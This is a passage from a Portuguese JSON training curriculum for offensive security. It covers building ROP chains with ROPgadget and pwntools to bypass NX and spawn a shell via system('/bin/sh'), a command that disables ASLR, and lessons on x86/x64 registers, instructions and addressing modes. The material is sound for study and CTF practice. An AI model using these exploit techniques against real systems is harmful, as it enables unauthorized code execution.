                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.4.3.1"
                            ]
                          },
                          {
                            "id": "10.1.6.4.3.3",
                            "name": "Construir cadeia ROP básica para controle de fluxo",
                            "description": "Encontrar gadgets (pop/ret, etc.) com ROPgadget, chain múltiplos RET para executar código arbitrário bypassing NX, testando em exploit.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de ROP e Gadgets Básicos",
                                  "subSteps": [
                                    "Estude o conceito de Return-Oriented Programming (ROP) como técnica para bypassar NX/DEP usando código existente.",
                                    "Identifique gadgets ROP comuns, como 'pop rdi; ret;', 'pop rsi; ret;' e sequências de RET para alinhamento de pilha.",
                                    "Revise arquitetura x86/x64 e como retornos controlam o fluxo via ponteiro de pilha (RSP/RIP).",
                                    "Analise um exemplo simples de gadget chain para carregar argumentos em registradores.",
                                    "Pratique visualizando o fluxo de execução em diagramas de pilha."
                                  ],
                                  "verification": "Liste e explique 3 gadgets ROP comuns e seu propósito em uma chain.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação ROPgadget",
                                    "Tutoriais ROP em Exploit-DB",
                                    "Binário de exemplo vulnerável"
                                  ],
                                  "tips": "Comece com arquitetura x86-64 para simplicidade; use diagramas para mapear pilha.",
                                  "learningObjective": "Compreender como gadgets ROP permitem execução arbitrária sem injeção de shellcode.",
                                  "commonMistakes": [
                                    "Ignorar alinhamento de pilha (8 bytes em x64)",
                                    "Confundir gadgets pop com mov",
                                    "Esquecer endereços absolutos vs relativos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e Usar ROPgadget para Encontrar Gadgets",
                                  "subSteps": [
                                    "Instale ROPgadget via pip: 'pip install ROPgadget'.",
                                    "Baixe um binário vulnerável sem PIE/ASLR para testes (ex: use pwntools para gerar).",
                                    "Execute 'ROPgadget --binary vuln' para listar todos os gadgets.",
                                    "Filtre gadgets específicos: 'ROPgadget --binary vuln --string \"sh\"' ou '--only \"pop|ret\"'.",
                                    "Salve gadgets úteis (pop rdi; ret;, system@plt) em um arquivo para referência."
                                  ],
                                  "verification": "Gere uma lista de pelo menos 5 gadgets relevantes de um binário de teste.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Python 3+",
                                    "Binário ELF vulnerável (ex: de picoCTF)",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Desative ASLR com 'echo 0 > /proc/sys/kernel/randomize_va_space' para testes estáticos.",
                                  "learningObjective": "Dominar a ferramenta ROPgadget para descoberta eficiente de gadgets.",
                                  "commonMistakes": [
                                    "Executar em binários com PIE (use --no-pie)",
                                    "Ignorar gadgets bad chars",
                                    "Não verificar arquitetura (32 vs 64 bits)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir uma Cadeia ROP Simples com Múltiplos RET",
                                  "subSteps": [
                                    "Selecione gadgets: pop rdi; ret; para arg1, endereço de \"/bin/sh\" para arg2.",
                                    "Monte a chain: [endereço_sh, pop_rdi_ret, system_plt, padding].",
                                    "Use pwntools ou Python para gerar payload: p64(endereços) em sequência.",
                                    "Adicione RET sled (múltiplos ret;) para alinhamento e robustez.",
                                    "Valide a chain manualmente calculando offsets de pilha."
                                  ],
                                  "verification": "Escreva uma chain ROP que chame system(\"/bin/sh\") com endereços corretos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Pwntools (pip install pwntools)",
                                    "Editor de texto/Python",
                                    "GDB para verificação"
                                  ],
                                  "tips": "Use cyclic patterns (cyclic 100) para encontrar offset exato do buffer overflow.",
                                  "learningObjective": "Construir chains ROP funcionais para controle de fluxo básico.",
                                  "commonMistakes": [
                                    "Ordem errada de argumentos (little-endian)",
                                    "Falta de padding para alinhar RIP",
                                    "Endereços incorretos de PLT"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Chain ROP em Exploit de Buffer Overflow",
                                  "subSteps": [
                                    "Identifique vulnerabilidade: buffer overflow em função vulnerável.",
                                    "Gere payload completo: junk + ROP chain + null bytes se necessário.",
                                    "Escreva script Python: context.binary=vuln; p = process('./vuln'); p.sendline(payload).",
                                    "Execute e observe se ganha shell.",
                                    "Ajuste para bypass NX executando apenas código existente."
                                  ],
                                  "verification": "O exploit abre shell interativa sem crash.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário vulnerável com NX ativado",
                                    "Pwntools",
                                    "GDB-PEDA ou GEF"
                                  ],
                                  "tips": "Use 'checksec vuln' para confirmar NX on e outros mitigations off.",
                                  "learningObjective": "Aplicar ROP para bypassar proteções em exploits reais.",
                                  "commonMistakes": [
                                    "Canary leak não handled",
                                    "ASLR não desabilitado em lab",
                                    "Payload muito longo causando segfault"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Depurar e Refinar o Exploit ROP",
                                  "subSteps": [
                                    "Debugue com GDB: 'gdb ./vuln', set args, run, 'x/50gx $rsp' para inspecionar pilha.",
                                    "Use 'ROPgadget --chain 5' para chains automáticas e compare.",
                                    "Teste em ambiente remoto (ex: netcat) simulando servidor.",
                                    "Registre falhas e itere: ajuste offsets, gadgets alternativos.",
                                    "Documente a chain final com explicação."
                                  ],
                                  "verification": "Exploit funciona consistentemente em 3 execuções, com shell estável.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB com plugins (PEDA/GEF)",
                                    "Netcat para testes remotos"
                                  ],
                                  "tips": "Breakpoint em main/ret para pausar e examinar registradores.",
                                  "learningObjective": "Depurar e otimizar chains ROP para confiabilidade.",
                                  "commonMistakes": [
                                    "Não checar registradores pós-gadget",
                                    "Ignorar partial overwrites",
                                    "Testar só local sem remote"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário 'vuln' com buffer overflow e NX ativado: ROPgadget encontra 'pop rdi; ret; @ 0x40123e' e 'system@plt @ 0x401030'. Chain: [0x402010 (\"/bin/sh\"), 0x40123e, 0x401030]. Payload: b'A'*offset + chain. Exploit: p.sendline(payload); p.interactive() abre shell.",
                              "finalVerifications": [
                                "Lista gadgets corretos de binário com ROPgadget.",
                                "Constrói chain ROP que chama system(\"/bin/sh\").",
                                "Exploit bypassa NX e ganha shell em binário protegido.",
                                "Depura chain em GDB sem erros de alinhamento.",
                                "Documenta chain com offsets e propósitos.",
                                "Testa em ambiente com ASLR off/on."
                              ],
                              "assessmentCriteria": [
                                "Chain ROP usa apenas gadgets existentes, sem shellcode.",
                                "Exploit executa código arbitrário (shell) consistentemente.",
                                "Todos os offsets e alinhamentos corretos (sem segfault).",
                                "Bypassa NX/DEP efetivamente.",
                                "Documentação clara de gadgets e lógica.",
                                "Depuração demonstra compreensão de fluxo de pilha."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86/x64: Leitura de gadgets e registradores.",
                                "Engenharia Reversa: Análise binária com objdump/readelf.",
                                "Buffer Overflow: Controle inicial de RIP para ROP.",
                                "Debugging: Uso avançado de GDB para pilha e breakpoints.",
                                "Mitigações de Segurança: Entender W^X e ASLR."
                              ],
                              "realWorldApplication": "Pentesters constroem ROP chains para explorar binários em CTFs, auditorias de software e desenvolvimento de PoCs para CVEs, demonstrando bypass de proteções modernas como DEP/NX em ataques reais."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.4.3.2"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.5",
                    "name": "Análise de Assembly 32 e 64 Bits",
                    "description": "Conceitos básicos de assembly, chamadas de sistema e acesso a memória em arquiteturas x86 e x64.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.5.1",
                        "name": "Conceitos Básicos de Assembly x86 (32 bits)",
                        "description": "Fundamentos da linguagem assembly na arquitetura x86 de 32 bits, incluindo registradores, instruções aritméticas e lógicas, e modos de endereçamento.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.5.1.1",
                            "name": "Identificar registradores em x86",
                            "description": "Reconhecer e descrever os registradores principais (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP) e seu uso em operações básicas de manipulação de dados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos básicos de registradores em x86 32-bit",
                                  "subSteps": [
                                    "Defina o que é um registrador na arquitetura x86: pequenas áreas de armazenamento de alta velocidade dentro da CPU.",
                                    "Diferencie registradores de memória RAM: registradores são mais rápidos e usados para operações imediatas.",
                                    "Identifique o contexto de 32 bits: cada registrador geral tem 32 bits (prefixo E- para extended).",
                                    "Revise a arquitetura geral x86: CPU possui cerca de 16 registradores de propósito geral acessíveis em modo 32-bit.",
                                    "Estude o diagrama de registradores x86 para visualização."
                                  ],
                                  "verification": "Escreva uma definição em suas palavras e desenhe um diagrama simples dos registradores principais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Intel x86 Manuals (Volume 2)",
                                    "Ferramenta de desenho como Draw.io ou papel e caneta",
                                    "Vídeo tutorial sobre registradores x86 no YouTube"
                                  ],
                                  "tips": "Visualize registradores como 'variáveis internas' da CPU para agilizar cálculos.",
                                  "learningObjective": "Entender o papel e a importância dos registradores na execução eficiente de instruções assembly.",
                                  "commonMistakes": [
                                    "Confundir registradores x86 32-bit com x64 (RAX etc.)",
                                    "Achar que registradores são ilimitados",
                                    "Ignorar a hierarquia de velocidade: registrador > cache > RAM"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Memorizar e descrever registradores de propósito geral (EAX, EBX, ECX, EDX)",
                                  "subSteps": [
                                    "Estude EAX: acumulador para operações aritméticas (ADD, MUL) e retorno de funções.",
                                    "Analise EBX: registrador base para dados, frequentemente usado em loops e índices.",
                                    "Examine ECX: contador para loops (LOOP instrução) e shifts.",
                                    "Revise EDX: extensão para multiplicação/divisão (com EAX) e I/O ports.",
                                    "Crie uma tabela mnemônica: EAX=Acumulador, EBX=Base, ECX=Counter, EDX=Data/Divisor."
                                  ],
                                  "verification": "Liste os 4 registradores com uma função principal cada e recite sem olhar notas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Tabela impressa de registradores x86",
                                    "Flashcards (Anki app recomendado)",
                                    "Exemplos de código assembly simples"
                                  ],
                                  "tips": "Use mnemônicos: 'A B C D' para lembrar a ordem: Accumulator, Base, Counter, Data.",
                                  "learningObjective": "Reconhecer e associar funções específicas dos registradores de propósito geral em operações básicas.",
                                  "commonMistakes": [
                                    "Confundir ECX com contador universal (é específico para LOOP)",
                                    "Esquecer papel de EDX em MUL/DIV",
                                    "Trocar EBX por EAX em exemplos aritméticos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar registradores de índice e pilha (ESI, EDI, EBP, ESP)",
                                  "subSteps": [
                                    "Defina ESI: Source Index para origem em strings (MOVS, LODS).",
                                    "Descreva EDI: Destination Index para destino em strings (STOS, MOVS).",
                                    "Analise EBP: Base Pointer para frame de pilha, acesso a parâmetros locais.",
                                    "Estude ESP: Stack Pointer para topo da pilha (PUSH/POP, CALL/RET).",
                                    "Compare usos: ESI/EDI para blocos de memória, EBP/ESP para gerenciamento de pilha."
                                  ],
                                  "verification": "Explique diferenças entre ESI/EDI e EBP/ESP com um exemplo de instrução cada.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Simulador de assembly como NASM ou online como Godbolt.org",
                                    "Diagramas de pilha x86",
                                    "Exemplos de código com PUSH/POP"
                                  ],
                                  "tips": "Pense em ESP como 'dedo' apontando para o topo da pilha; EBP como 'mapa' do frame atual.",
                                  "learningObjective": "Diferenciar e descrever usos de registradores especializados em manipulação de memória e pilha.",
                                  "commonMistakes": [
                                    "Confundir ESI com EDI (source vs destination)",
                                    "Achar que ESP é só para PUSH (muda com qualquer operação de pilha)",
                                    "Ignorar alinhamento de pilha em EBP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação em códigos assembly reais",
                                  "subSteps": [
                                    "Analise snippet: mov eax, 10; add ebx, eax; identifique registradores usados.",
                                    "Identifique em loop: mov ecx, 5; loop: dec ecx; jnz loop; (ECX como contador).",
                                    "Examine pilha: push eax; mov esp, ebp; pop ebp; (ESP e EBP).",
                                    "Desmonte binário simples com objdump ou IDA Free para spotting registradores.",
                                    "Crie seu próprio código com todos os 8 registradores e anote usos."
                                  ],
                                  "verification": "Desmonte um código curto e liste todos registradores com seu papel no snippet.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Compilador NASM ou GCC com -S flag",
                                    "Ferramenta objdump",
                                    "Exemplos de shellcode simples"
                                  ],
                                  "tips": "Use cores diferentes para destacar cada registrador em snippets de código.",
                                  "learningObjective": "Aplicar conhecimento para identificar e interpretar registradores em instruções assembly reais.",
                                  "commonMistakes": [
                                    "Não notar registradores implícitos (ex: MUL usa EDX:EAX)",
                                    "Ignorar registradores em operandos indiretos",
                                    "Confundir uso contextual (EAX nem sempre é acumulador)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um shellcode simples de exploit: 'mov eax, 0xdeadbeef; push eax; mov ebx, esp; mov [ebx], ecx' - Aqui, EAX carrega valor, ESP gerencia pilha via PUSH, EBX aponta para topo da pilha, ECX fornece dados para store indireto via EBX.",
                              "finalVerifications": [
                                "Liste corretamente os 8 registradores principais sem erros.",
                                "Descreva o uso típico de EAX, ECX e ESP com exemplos.",
                                "Identifique registradores em um snippet assembly de 10 linhas.",
                                "Diferencie registradores de propósito geral de pilha/índice.",
                                "Explique como ESP muda com PUSH/POP.",
                                "Recite mnemônicos para todos os registradores."
                              ],
                              "assessmentCriteria": [
                                "Precisão na nomenclatura e tamanhos (32-bit): 100% correto.",
                                "Descrições funcionais detalhadas e contextualizadas: pelo menos 80% cobertura.",
                                "Identificação correta em exemplos práticos: sem confusões entre similares.",
                                "Compreensão de usos implícitos/explícitos em instruções.",
                                "Capacidade de explicar interações (ex: pilha com ESP/EBP).",
                                "Criatividade em mnemônicos ou analogias pessoais."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: registradores mapeiam para variáveis locais e passagem de parâmetros via pilha.",
                                "Análise de Malware: identificar registradores em shellcode para entender payloads de exploits.",
                                "Sistemas Operacionais: gerenciamento de pilha e context switch envolvendo ESP/EBP.",
                                "Engenharia de Software: debugging com GDB, inspecionando registradores em tempo real.",
                                "Matemática Computacional: operações aritméticas otimizadas via EAX/EDX."
                              ],
                              "realWorldApplication": "Na análise de engenharia reversa de binários maliciosos, identificar registradores permite mapear manipulação de dados em exploits buffer overflow, entender ROP chains (usando ESP/EBP) e desenvolver signatures de detecção em ferramentas como IDA Pro ou Ghidra."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.1.2",
                            "name": "Interpretar instruções básicas de assembly x86",
                            "description": "Analisar instruções como MOV, ADD, SUB, CMP, JMP e CALL, entendendo sua sintaxe, operandos e impacto no fluxo de execução.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a sintaxe geral das instruções x86",
                                  "subSteps": [
                                    "Identifique os componentes básicos: mnemonic (ex: MOV), operandos (registradores como EAX, valores imediatos, endereços de memória) e separadores.",
                                    "Estude a notação AT&T vs Intel (foco em Intel: destino primeiro).",
                                    "Aprenda tamanhos de operandos: byte (8-bit), word (16-bit), dword (32-bit).",
                                    "Revise registradores principais: EAX, EBX, ECX, EDX, ESP, EBP, EIP.",
                                    "Analise flags do processador (ZF, CF, SF, OF) afetadas por instruções."
                                  ],
                                  "verification": "Explique corretamente a sintaxe de uma instrução como 'MOV EAX, 0x10' em um diagrama ou verbalmente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (PDF ou online)",
                                    "Editor de texto para anotar exemplos",
                                    "Ferramenta como x32dbg ou OllyDbg para visualização"
                                  ],
                                  "tips": "Use diagramas para mapear operandos origem-destino; memorize registradores com mnemônicos (Accumulator, Base, Counter, Data).",
                                  "learningObjective": "Dominar a estrutura sintática das instruções x86 para decodificação inicial.",
                                  "commonMistakes": [
                                    "Confundir ordem de operandos Intel vs AT&T",
                                    "Ignorar tamanhos de operandos levando a erros de tipo",
                                    "Esquecer que EIP é o IP de instrução"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Interpretar instruções de transferência de dados (MOV)",
                                  "subSteps": [
                                    "Analise MOV reg, reg (ex: MOV EAX, EBX): copia valor sem alterar flags.",
                                    "Estude MOV reg, imm (ex: MOV ECX, 5): carrega imediato em registrador.",
                                    "Examine MOV reg, [mem] e [mem], reg: acesso indireto via endereço.",
                                    "Pratique com variações: MOVSX (sign-extend), MOVZX (zero-extend).",
                                    "Simule execução passo a passo rastreando valores de registradores."
                                  ],
                                  "verification": "Preveja valores de registradores após uma sequência de 3 MOVs em um simulador ou papel.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Simulador online como Godbolt ou emu8086",
                                    "Papel e caneta para tracing manual",
                                    "Exemplos de código assembly simples"
                                  ],
                                  "tips": "Sempre trace valores antes/depois; lembre que MOV não afeta flags.",
                                  "learningObjective": "Identificar e simular o impacto de MOV no estado da CPU.",
                                  "commonMistakes": [
                                    "Pensar que MOV soma ou altera flags",
                                    "Confundir registradores de 32-bit com 8-bit (ex: AL vs EAX)",
                                    "Ignorar segmentação em memória"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar instruções aritméticas e de comparação (ADD, SUB, CMP)",
                                  "subSteps": [
                                    "Estude ADD reg, src: soma src a reg, atualiza flags (CF, ZF, etc.).",
                                    "Pratique SUB reg, src: subtrai src de reg, flags semelhantes a ADD.",
                                    "Analise CMP reg1, reg2: subtrai sem armazenar, só flags para branches.",
                                    "Simule carry/borrow e overflow em exemplos com números negativos.",
                                    "Rastreie flags após cada operação para prever condições."
                                  ],
                                  "verification": "Calcule flags e resultado final de uma sequência ADD/SUB/CMP manualmente.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Calculadora binária ou Python para verificação",
                                    "Tabela de flags x86",
                                    "Debugger como x32dbg"
                                  ],
                                  "tips": "Use representação binária para visualizar carry; memorize que CMP é como SUB mas sem escrita.",
                                  "learningObjective": "Prever mudanças em registradores e flags por operações aritméticas/comparativas.",
                                  "commonMistakes": [
                                    "Esquecer atualização de flags",
                                    "Confundir sinal de overflow com carry",
                                    "Não considerar wrap-around em 32-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar instruções de controle de fluxo (JMP, CALL)",
                                  "subSteps": [
                                    "Analise JMP label/rel: salto incondicional, altera EIP.",
                                    "Estude CALL label: push EIP na stack, salta para subroutine.",
                                    "Diferencie JMP direto (imm) vs indireto ([reg]); relative vs absolute.",
                                    "Simule stack para CALL/RET: push EIP, depois RET pop EIP.",
                                    "Identifique loops e condições baseadas em flags (ex: JZ após CMP)."
                                  ],
                                  "verification": "Desenhe o grafo de fluxo de controle para um snippet com JMP/CALL.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta de disassemblador como IDA Free ou Ghidra",
                                    "Exemplos de assembly com loops",
                                    "Stack trace diagrams"
                                  ],
                                  "tips": "Pense em JMP como goto; CALL inicia função, RET retorna.",
                                  "learningObjective": "Mapear impacto de JMP/CALL no fluxo de execução e stack.",
                                  "commonMistakes": [
                                    "Confundir JMP com JE/JNE (condicionais)",
                                    "Esquecer push/pop na CALL/RET",
                                    "Não rastrear EIP corretamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Dado o código: MOV EAX, 10; ADD EAX, 5; CMP EAX, 15; JZ label1; CALL subroutine; label1: RET. Explique: EAX=15, ZF=1 após CMP, salta para label1 pulando CALL, RET encerra.",
                              "finalVerifications": [
                                "Explicar sintaxe e efeito de MOV EAX, [EBX+4] corretamente.",
                                "Prever flags após ADD EBX, 0xFFFFFFFF.",
                                "Traçar fluxo completo de um snippet com CMP e JMP.",
                                "Simular CALL sem debugger, incluindo stack.",
                                "Identificar 3 diferenças entre 32-bit e 64-bit operandos básicos.",
                                "Decodificar 5 instruções mistas sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de sintaxe (100% correto).",
                                "Correta previsão de registradores/flags pós-execução.",
                                "Análise precisa de fluxo de controle (sem loops infinitos errados).",
                                "Uso correto de terminologia x86 (operandos, flags).",
                                "Explicação clara de impactos em memória/stack.",
                                "Velocidade e confiança em exemplos reais (em <2min por instrução)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como compila para assembly (ex: variáveis -> registradores).",
                                "Sistemas Operacionais: Análise de syscalls e interrupções via CALL.",
                                "Segurança Computacional: Identificar ROP gadgets com JMP/CALL.",
                                "Matemática Binária: Operações bitwise e aritméticas em base 2.",
                                "Engenharia de Software: Debugging e otimização de código baixo-nível."
                              ],
                              "realWorldApplication": "Em análise de malware, interpretar assembly de binários para detectar saltos condicionais em checks de anti-debugging; em reverse engineering de cracks, mapear fluxos de autenticação via JMP/CALL para bypass."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.1.3",
                            "name": "Compreender modos de endereçamento em x86",
                            "description": "Explicar modos de endereçamento direto, indireto, baseado em registrador e indexado, com exemplos de acesso a dados na memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os fundamentos de endereçamento de memória em x86",
                                  "subSteps": [
                                    "Estude o modelo de memória segmentada em x86 32 bits (CS, DS, SS, etc.).",
                                    "Revise registradores de uso geral (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP).",
                                    "Identifique a sintaxe básica de operandos de memória: [segmento:offset] ou simplificado [offset].",
                                    "Analise como o processador calcula o endereço físico: base + offset + deslocamentos.",
                                    "Explore documentação oficial da Intel sobre Effective Address (EA)."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como um endereço de memória é calculado em x86.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Manual Intel x86 (vol. 2), Emulador online como Godbolt ou x86emu"
                                  ],
                                  "tips": "Use diagramas para visualizar segmentos e registradores.",
                                  "learningObjective": "Compreender o cálculo de endereços efetivos como base para modos específicos.",
                                  "commonMistakes": [
                                    "Confundir registradores de segmento com de uso geral",
                                    "Ignorar o papel do DS por padrão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar o modo de endereçamento direto",
                                  "subSteps": [
                                    "Defina modo direto: uso de endereço absoluto, ex: mov eax, [0x400000].",
                                    "Escreva e compile um código assembly simples com instrução de carga/armazenamento direto.",
                                    "Desmonte o binário com objdump ou xxd para verificar o opcode.",
                                    "Teste em emulador alterando o endereço e observando o valor carregado.",
                                    "Compare com modo imediato (não memória) para diferenciar."
                                  ],
                                  "verification": "Execute código e confirme que acessa exatamente o endereço especificado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "NASM ou MASM, GDB ou x32dbg, Código fonte simples"
                                  ],
                                  "tips": "Comece com endereços fixos pequenos para evitar problemas de paging.",
                                  "learningObjective": "Explicar e implementar acessos diretos à memória com exemplos.",
                                  "commonMistakes": [
                                    "Usar colchetes em constantes imediatas",
                                    "Esquecer de declarar seções de dados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar modos indireto e baseado em registrador",
                                  "subSteps": [
                                    "Defina indireto: [reg], ex: mov eax, [ebx] onde EBX aponta para o dado.",
                                    "Defina baseado: [reg + disp8/32], ex: mov eax, [ebp + 8] para acesso a parâmetros.",
                                    "Escreva código usando ESI/EDI para strings e EBP para stack frame.",
                                    "Debugue passo a passo observando valores de registradores e memória.",
                                    "Diferencie indireto puro de baseado com deslocamento."
                                  ],
                                  "verification": "Modifique valor de registrador e veja mudança no dado acessado.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Debugger x32dbg, Exemplos de código com loops de string"
                                  ],
                                  "tips": "Use EBP para praticar convenções de calling stack.",
                                  "learningObjective": "Implementar e debugar acessos indiretos e baseados.",
                                  "commonMistakes": [
                                    "Não inicializar registrador base",
                                    "Confundir disp8 com disp32 em overflows"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estudar modo indexado e combinações avançadas",
                                  "subSteps": [
                                    "Defina indexado: [index * scale + disp], scale=1,2,4,8; ex: [ecx*4 + 10].",
                                    "Implemente array traversal: lea ebx, [esi + eax*4] para vetores.",
                                    "Combine modos: [base + index*scale + disp], ex: estrutura de dados.",
                                    "Analise disassembly de programa C compilado para ver traduções.",
                                    "Teste limites: scales inválidos e overflows em cálculos."
                                  ],
                                  "verification": "Acesse elementos corretos de um array simulando ponteiros.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Compilador GCC com -S, Godbolt.org para assembly gerado"
                                  ],
                                  "tips": "Pratique com arrays de int para scale=4.",
                                  "learningObjective": "Usar modos indexados em cenários reais como arrays.",
                                  "commonMistakes": [
                                    "Escala incorreta para tipo de dado",
                                    "Assinatura errada em disp negativo"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar com exemplos integrados e análise",
                                  "subSteps": [
                                    "Desmonte um binário real (ex: hello world) e identifique todos os modos.",
                                    "Escreva função assembly misturando todos os 4 modos.",
                                    "Simule exploit simples: buffer overflow alterando [ebp+8].",
                                    "Crie tabela comparativa dos modos com opcodes e usos.",
                                    "Resolva exercícios: dado opcode, identifique modo."
                                  ],
                                  "verification": "Identifique e explique modos em 3 snippets de disassembly.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Binários de teste, Cheat sheet x86 opcodes"
                                  ],
                                  "tips": "Use cut/paste de disassembly para anotações.",
                                  "learningObjective": "Aplicar todos os modos em análise prática.",
                                  "commonMistakes": [
                                    "Interpretar errado SIB byte em indexado",
                                    "Ignorar RIP-relative em 64bits (foco 32)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um programa assembly: section .data msg db 'Hello',0 ; direto: mov eax, [msg] ; indireto: mov ebx, msg; mov eax, [ebx] ; baseado: mov eax, [ebp+4] (parâmetro) ; indexado: array db 1,2,3,4; mov al, [esi + ecx*1] (acesso array). Compile com nasm -f elf32 e rode em gdb para observar acessos.",
                              "finalVerifications": [
                                "Explicar diferenças entre os 4 modos com exemplos de sintaxe.",
                                "Identificar modo em snippet de disassembly aleatório.",
                                "Calcular endereço efetivo dado registradores e disp.",
                                "Implementar código funcional usando cada modo.",
                                "Diferenciar x86 32bits de 64bits em modos básicos.",
                                "Simular erro comum como null pointer em indireto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e exemplos de cada modo (80% correto).",
                                "Capacidade de implementar código sem erros de sintaxe.",
                                "Análise correta de disassembly com identificação de EA.",
                                "Uso apropriado de escalas e deslocamentos em indexado.",
                                "Integração em contexto de stack frame e dados.",
                                "Criatividade em exemplos práticos de segurança."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Cálculo de endereços e cache.",
                                "Programação em C: Tradução de ponteiros e arrays para assembly.",
                                "Sistemas Operacionais: Gerenciamento de memória e segments.",
                                "Segurança Computacional: Exploração de offsets em ROP/Buffer Overflow."
                              ],
                              "realWorldApplication": "Na engenharia reversa de malwares, compreender modos de endereçamento permite mapear acessos a shellcodes, detectar heap spraying via indexados e analisar ROP chains baseados em stack frames, essencial para detecção de vulnerabilidades em binários 32 bits legados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.5.2",
                        "name": "Conceitos Básicos de Assembly x64 (64 bits)",
                        "description": "Diferenças e fundamentos da linguagem assembly na arquitetura x64, incluindo registradores estendidos e convenções de chamada.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.5.2.1",
                            "name": "Identificar registradores em x64",
                            "description": "Diferenciar registradores de 64 bits (RAX, RBX, etc.) dos de 32 bits e descrever registradores adicionais como R8-R15 e os de uso geral SSE/AVX.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Memorizar os Registradores de Uso Geral Principais em x64",
                                  "subSteps": [
                                    "Liste os 8 registradores principais de 64 bits: RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP.",
                                    "Associe funções comuns: RAX (acumulador), RCX (contador), RDX (dados/IO), RSI/RDI (origem/destino string), RBP (base stack frame), RSP (stack pointer).",
                                    "Crie um mnemônico para lembrar a ordem: 'A B C D Source Dest Base Stack'.",
                                    "Desenhe um diagrama simples mostrando os registradores."
                                  ],
                                  "verification": "Recite verbalmente ou por escrito a lista completa com funções sem consultar materiais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Diagrama de registradores x64 (busque 'x64 registers diagram' no Google)",
                                    "Documentação Intel x64 manual (seção registers)"
                                  ],
                                  "tips": "Use cores diferentes no diagrama para registrar nomes e funções para melhor retenção visual.",
                                  "learningObjective": "Identificar e descrever os 8 registradores de uso geral de 64 bits e suas funções típicas.",
                                  "commonMistakes": [
                                    "Confundir com registradores x86 de 32 bits (EAX em vez de RAX)",
                                    "Esquecer RSP e RBP, focando só em RAX-RDX"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar Tamanhos de Registradores (64-bit vs 32-bit e inferiores)",
                                  "subSteps": [
                                    "Aprenda os prefixos: R para 64-bit, E para 32-bit (EAX), AX para 16-bit, AL/AH para 8-bit.",
